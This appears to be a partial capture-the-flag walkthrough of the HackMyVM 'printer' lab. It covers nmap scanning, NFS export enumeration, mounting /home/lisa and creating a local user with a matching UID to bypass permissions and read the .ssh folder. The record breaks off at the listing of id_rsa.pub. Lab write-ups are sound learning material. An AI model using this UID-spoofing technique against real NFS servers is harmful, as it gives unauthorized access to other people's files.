
brief `enjoy`

# enum 

```sql 
#nmap 

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1896ad8971037f6c8ba1d283ca6f0e56 (RSA)
|   256 a41fbf9b2dccf682781c72bc319f7dfb (ECDSA)
|_  256 6af6fcffe8b862577c684d6ae3f449ce (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38346/udp6  mountd
|   100005  1,2,3      39288/udp   mountd
|   100005  1,2,3      46511/tcp   mountd
|   100005  1,2,3      56887/tcp6  mountd
|   100021  1,3,4      40775/tcp6  nlockmgr
|   100021  1,3,4      43413/tcp   nlockmgr
|   100021  1,3,4      49374/udp6  nlockmgr
|   100021  1,3,4      50987/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
40969/tcp open  mountd   1-3 (RPC #100005)
43413/tcp open  nlockmgr 1-4 (RPC #100021)
46511/tcp open  mountd   1-3 (RPC #100005)
50077/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:9B:D0:41 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

- added printer ip to hosts list `printer.hmv`
- next mountd  
- `showmount -e printer.hmv`
- gives us this directory 
- `/home/lisa` 
- let's mount that directory 
-  mounted but can't access the .ssh dir 
```sql 
┌─[m1cr0@veric]─[~/Desktop/HMV/printer/lisamtd]
└──╼ $ls -la
total 28
drwxr-xr-x 4  1098 lpadmin 4096 Jan  8  2023 .
drwxr-xr-x 1 m1cr0 m1cr0     30 Aug 11 17:44 ..
lrwxrwxrwx 1 root  root       9 Jan  7  2023 .bash_history -> /dev/null
-rw-r--r-- 1  1098 lpadmin  220 Jan  7  2023 .bash_logout
-rw-r--r-- 1  1098 lpadmin 3555 Jan  7  2023 .bashrc
drwxr-xr-x 3  1098 lpadmin 4096 Jan  7  2023 .local
-rw-r--r-- 1  1098 lpadmin  807 Jan  7  2023 .profile
drwx------ 2  1098 lpadmin 4096 Jan  8  2023 .ssh
-rwx------ 1  1098 lpadmin   33 Jan  7  2023 user.txt
┌─[m1cr0@veric]─[~/Desktop/HMV/printer/lisamtd]
└──╼ $cd .ssh/
bash: cd: .ssh/: Permission denied
┌─[✗]─[m1cr0@veric]─[~/Desktop/HMV/printer/lisam
```

- useradd 
```sql 
┌─[root@veric]─[/home/m1cr0/Desktop/HMV/printer]
└──╼ #useradd -u 1098 hack -p hack -M
configuration error - unknown item 'NONEXISTENT' (notify administrator)
configuration error - unknown item 'PREVENT_NO_AUTH' (notify administrator)
┌─[root@veric]─[/home/m1cr0/Desktop/HMV/printer]
└──╼ #su hack
$ id
uid=1098(hack) gid=1098(hack) groups=1098(hack)
$ /bin/bash -i 
┌─[hack@veric]─[/home/m1cr0/Desktop/HMV/printer]
└──╼ $

```

- ssh pub
```bash
┌─[✗]─[hack@veric]─[/home/m1cr0/Desktop/HMV/printer/lisamtd/.ssh]
└──╼ $ls
bash: /dev/stderr: Permission denied
id_rsa.pub
┌─[hack@veric]─[/home/m1cr0/Desktop/HMV/printer/lisamtd/.ssh]
└──╼ $ls -la
bash: /dev/stderr: Permission denied
total 12
drwx------ 2 hack lpadmin 4096 Jan  8  2023 .
drwxr-xr-x 4 hack lpadmin 4096 Jan  8  2023 ..
-rw-r--r-- 1 hack lpadmin  566 Jan  8  2023 id_rsa.pub
┌─[hack@veric]─[/home/m1cr0/Desktop/HMV/printer/lisamtd/.ssh]
└──╼ $
```

